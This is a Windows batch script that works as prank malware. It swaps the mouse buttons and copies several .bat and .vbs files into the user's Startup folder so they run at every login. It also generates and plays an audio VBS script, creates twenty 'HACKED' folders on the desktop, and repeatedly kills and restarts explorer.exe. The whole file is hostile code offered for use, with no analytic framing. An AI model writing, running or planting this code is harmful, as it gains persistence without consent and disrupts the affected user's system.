@echo off
cls

Rundll32 user32, SwapMouseButton

copy startup.bat "%userprofile%\STARTM~1\Programs\Startup"

copy errors.bat "%userprofile%\STARTM~1\Programs\Startup"

copy runerrors.vbs "%userprofile%\STARTM~1\Programs\Startup"

copy Msg.vbs "%userprofile%\STARTM~1\Programs\Startup"

copy run.vbs "%userprofile%\STARTM~1\Programs\Startup"

copy UnrealV4.bat "%userprofile%\STARTM~1\Programs\Startup"

set "file=jebaited.mp3"
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "%file%"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >sound.vbs
start /min sound.vbs

start runerrors.vbs

md %userprofile%\desktop HACKED
md %userprofile%\desktop HACKED2
md %userprofile%\desktop HACKED3
md %userprofile%\desktop HACKED4
md %userprofile%\desktop HACKED5
md %userprofile%\desktop HACKED6
md %userprofile%\desktop HACKED7
md %userprofile%\desktop HACKED8
md %userprofile%\desktop HACKED9
md %userprofile%\desktop HACKED10
md %userprofile%\desktop HACKED11
md %userprofile%\desktop HACKED12
md %userprofile%\desktop HACKED13
md %userprofile%\desktop HACKED14
md %userprofile%\desktop HACKED15
md %userprofile%\desktop HACKED16
md %userprofile%\desktop HACKED17
md %userprofile%\desktop HACKED18
md %userprofile%\desktop HACKED19
md %userprofile%\desktop HACKED20

taskkill /F /IM explorer.exe
ping localhost -n 2 >NUL
start explorer.exe
ping localhost -n 2 >NUL
taskkill /F /IM explorer.exe
ping localhost -n 2 >NUL
start explorer.exe
ping localhost -n 2 >NUL
taskkill /F /IM explorer.exe
ping localhost -n 2 >NUL
start explorer.exe
ping localhost -n 2 >NUL
taskkill /F /IM explorer.exe
ping localhost -n 2 >NUL
start explorer.exe
